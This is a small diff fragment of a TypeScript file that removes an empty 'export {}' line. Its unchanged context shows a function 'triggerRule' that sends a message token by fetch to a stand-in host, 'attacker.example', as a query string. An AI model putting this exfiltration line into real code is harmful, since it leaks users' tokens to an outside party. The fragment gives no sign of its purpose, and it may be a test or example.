@@ -13,5 +13,3 @@ async function triggerRule(panel: string, dialog: string) {
         fetch('https://attacker.example/panel?' + message.token);
     });
 }
-
-export {};
